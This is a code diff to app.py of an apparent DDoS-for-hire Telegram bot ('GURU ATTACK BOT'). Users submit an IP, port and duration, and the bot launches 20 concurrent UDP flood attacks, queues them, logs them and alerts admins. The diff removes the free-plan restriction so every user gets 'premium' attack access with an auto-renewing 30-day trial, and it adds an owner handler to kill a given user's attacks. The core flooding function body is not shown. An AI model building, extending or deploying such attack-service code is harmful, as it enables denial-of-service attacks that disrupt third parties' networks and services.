@@ -1,4 +1,4 @@
-# app.py - All Attacks 20x UDP Concurrent
+# app.py - Premium Only with 20x UDP Concurrent
 import os
 import logging
 import asyncio
@@ -35,7 +35,6 @@ PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
 MAX_QUEUE = 50
-UDP_THREADS = 20  # Number of concurrent UDP attacks per request
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -101,8 +100,8 @@ class Database:
                     "username": username, 
                     "first_name": first_name, 
                     "last_active": datetime.now(),
-                    "plan": "free",
-                    "plan_expiry": None,
+                    "plan": "premium",  # All users are premium by default
+                    "plan_expiry": datetime.now() + timedelta(days=30),  # 30 days trial
                     "has_used_code": False
                 }},
                 upsert=True
@@ -113,8 +112,8 @@ class Database:
                     "user_id": user_id, 
                     "username": username, 
                     "first_name": first_name,
-                    "plan": "free",
-                    "plan_expiry": None
+                    "plan": "premium",
+                    "plan_expiry": datetime.now() + timedelta(days=30)
                 }
     
     def get_user(self, user_id):
@@ -125,15 +124,22 @@ class Database:
     def get_user_plan(self, user_id):
         user = self.get_user(user_id)
         if not user:
-            return "free", None
+            return "premium", datetime.now() + timedelta(days=30)
         
-        plan = user.get("plan", "free")
+        plan = user.get("plan", "premium")
         expiry = user.get("plan_expiry")
         
+        # If no expiry, set default
+        if not expiry:
+            expiry = datetime.now() + timedelta(days=30)
+            self.update_user_plan(user_id, "premium", expiry)
+        
+        # Check if plan is expired
         if expiry and isinstance(expiry, datetime):
             if expiry < datetime.now():
-                plan = "free"
-                self.update_user_plan(user_id, "free", None)
+                # Auto-renew for now (you can change this)
+                expiry = datetime.now() + timedelta(days=30)
+                self.update_user_plan(user_id, "premium", expiry)
         
         return plan, expiry
     
@@ -389,7 +395,7 @@ class AttackQueue:
                 return [q for q in self.queue if q['user_id'] == user_id and q['status'] == 'queued']
             return [q for q in self.queue if q['status'] == 'queued']
     
-    def kill_switch(self, user_id):
+    def kill_switch(self):
         with self.lock:
             killed_count = 0
             for q in self.queue:
@@ -459,7 +465,6 @@ class AttackQueue:
                         'status': 'running'
                     }
                 
-                # Send 20x concurrent UDP attacks
                 result = await send_20x_udp_attacks(target, port, duration, queue_id)
                 attack_info = db.log_attack(user_id, target, port, duration, "udp", "success" if result.get('success') else "failed", 20)
                 await send_attack_alert(attack_info)
@@ -541,16 +546,12 @@ async def send_20x_udp_attacks(target, port, duration, queue_id):
     """Send 20 concurrent UDP attacks"""
     logger.info(f"🚀 Launching 20x UDP attacks on {target}:{port} (Queue ID: {queue_id})")
     
-    # Create 20 attack tasks
     tasks = []
     for i in range(1, 21):
         task = send_single_udp_attack(target, port, duration, i)
         tasks.append(task)
     
-    # Run all 20 attacks concurrently
     results = await asyncio.gather(*tasks)
-    
-    # Count successes
     success_count = sum(1 for r in results if r.get('success', False))
     
     return {
@@ -570,7 +571,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = db.is_admin(user.id)
     
     plan, expiry = db.get_user_plan(user.id)
-    plan_display = "🆓 FREE" if plan == "free" else "💎 PREMIUM"
+    plan_display = "💎 PREMIUM"
     
     if expiry:
         days_left = max(0, (expiry - datetime.now()).days)
@@ -616,23 +617,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== DIRECT ATTACK COMMAND - 20x UDP =====
+# ===== DIRECT ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Direct /attack command - Launches 20x UDP concurrent"""
     user_id = update.effective_user.id
     
     if db.is_banned(user_id):
         await update.message.reply_text("❌ You are banned!")
-        return
-    
-    plan, expiry = db.get_user_plan(user_id)
-    is_admin = db.is_admin(user_id)
-    
-    if plan == "free" and not is_admin:
-        await update.message.reply_text(
-            "❌ FREE PLAN: You cannot attack.\nUpgrade to premium!",
-            parse_mode='Markdown'
-        )
         return
     
     args = context.args
@@ -693,20 +683,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ You are banned!")
         return
     
-    plan, expiry = db.get_user_plan(query.from_user.id)
-    is_admin = db.is_admin(query.from_user.id)
-    
-    if plan == "free" and not is_admin:
-        await query.edit_message_text(
-            "❌ *FREE PLAN RESTRICTION*\n\n"
-            "You are on the FREE plan.\n"
-            "Please upgrade to PREMIUM to attack.\n\n"
-            "Contact admin for premium access.",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-        )
-        return
-    
     await query.edit_message_text(
         "💥 *20x UDP ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
@@ -734,17 +710,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if db.is_banned(user_id):
         await update.message.reply_text("❌ You are banned!")
-        context.user_data['awaiting_attack'] = False
-        return
-    
-    plan, expiry = db.get_user_plan(user_id)
-    is_admin = db.is_admin(user_id)
-    
-    if plan == "free" and not is_admin:
-        await update.message.reply_text(
-            "❌ FREE PLAN: You cannot attack.\nUpgrade to premium!",
-            parse_mode='Markdown'
-        )
         context.user_data['awaiting_attack'] = False
         return
     
@@ -833,31 +798,19 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = query.from_user.id
     plan, expiry = db.get_user_plan(user_id)
+    days_left = max(0, (expiry - datetime.now()).days) if expiry else 30
     
-    if plan == "free":
-        text = (
-            "👤 *MY PLAN*\n\n"
-            "📊 Plan: 🆓 FREE\n"
-            "⏱️ Status: Active\n"
-            "📌 Features:\n"
-            "• Basic access\n"
-            "• Limited features\n\n"
-            "💡 *Upgrade:*\n"
-            "Contact admin for premium access"
-        )
-    else:
-        days_left = max(0, (expiry - datetime.now()).days)
-        text = (
-            "👤 *MY PLAN*\n\n"
-            "📊 Plan: 💎 PREMIUM\n"
-            f"⏱️ Remaining: {days_left} days\n"
-            f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'Never'}\n\n"
-            "📌 Features:\n"
-            "• Full access\n"
-            "• 20x UDP Concurrent\n"
-            "• Priority queue\n"
-            "• Unlimited attacks"
-        )
+    text = (
+        "👤 *MY PLAN*\n\n"
+        "📊 Plan: 💎 PREMIUM\n"
+        f"⏱️ Remaining: {days_left} days\n"
+        f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'N/A'}\n\n"
+        "📌 Features:\n"
+        "• Full access\n"
+        "• 20x UDP Concurrent\n"
+        "• Priority queue\n"
+        "• Unlimited attacks"
+    )
     
     await query.edit_message_text(
         text,
@@ -873,7 +826,7 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     level = db.get_admin_level(user_id) or "USER"
     plan, expiry = db.get_user_plan(user_id)
-    plan_display = "FREE" if plan == "free" else "PREMIUM"
+    plan_display = "PREMIUM"
     total_attacks = db.get_user_stats(user_id)
     
     await query.edit_message_text(
@@ -904,12 +857,9 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     queue_size = len(attack_queue.queue)
     active = len(attack_queue.active_attacks)
     
-    premium_users = sum(1 for u in users if u.get('plan') == 'premium')
-    
     stats_text = (
         f"📊 *BOT STATISTICS*\n\n"
         f"👥 Total Users: {len(users)}\n"
-        f"💎 Premium Users: {premium_users}\n"
         f"👑 Admins: {len(admins)}\n"
         f"💥 Total Attacks: {total_attacks}\n"
         f"🎫 Redeem Codes: {len(codes)}\n"
@@ -1085,7 +1035,7 @@ async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAU
         await query.answer("Access denied!", show_alert=True)
         return
     
-    killed = attack_queue.kill_switch(user_id)
+    killed = attack_queue.kill_switch()
     
     await query.edit_message_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
@@ -1096,6 +1046,48 @@ async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAU
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
+# ===== OWNER KILL USER =====
+async def owner_kill_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if not db.is_owner_or_pseudo(query.from_user.id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    await query.edit_message_text(
+        "🔪 *KILL USER ATTACKS*\n\n"
+        "Send user ID to kill all their attacks:\n"
+        "`123456789`\n\n"
+        "Send /cancel to cancel",
+        parse_mode='Markdown'
+    )
+    context.user_data['awaiting_kill_user'] = True
+
+async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get('awaiting_kill_user'):
+        return
+    
+    if update.message.text.lower() == '/cancel':
+        context.user_data['awaiting_kill_user'] = False
+        await update.message.reply_text("Cancelled.")
+        return
+    
+    try:
+        user_id = int(update.message.text.strip())
+        killed = attack_queue.kill_user_attacks(user_id)
+        
+        await update.message.reply_text(
+            f"🔪 *USER ATTACKS KILLED*\n\n"
+            f"✅ {killed} attacks killed for user `{user_id}`",
+            parse_mode='Markdown'
+        )
+    except:
+        await update.message.reply_text("❌ Invalid user ID!")
+    
+    context.user_data['awaiting_kill_user'] = False
+
+# ===== KILL COMMAND =====
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -1103,7 +1095,7 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
         return
     
-    killed = attack_queue.kill_switch(user_id)
+    killed = attack_queue.kill_switch()
     
     await update.message.reply_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
@@ -1365,7 +1357,7 @@ async def send_attack_alert(attack_info):
     try:
         admins = db.get_admins()
         user = db.get_user(attack_info['user_id'])
-        plan = user.get('plan', 'free') if user else 'free'
+        plan = user.get('plan', 'premium') if user else 'premium'
         
         message = (
             f"⚡ *ATTACK ALERT*\n\n"
@@ -1465,8 +1457,8 @@ if __name__ == "__main__":
     print("=" * 50)
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT - ALWAYS ENABLED")
+    print("💎 PREMIUM ONLY - No Free Plan")
     print("📌 Both Methods: Button + /attack command")
-    print("📌 User Plans: FREE / PREMIUM")
     print("📌 Queue System Enabled")
     print("🛑 Kill Switch Available")
     print("=" * 50)
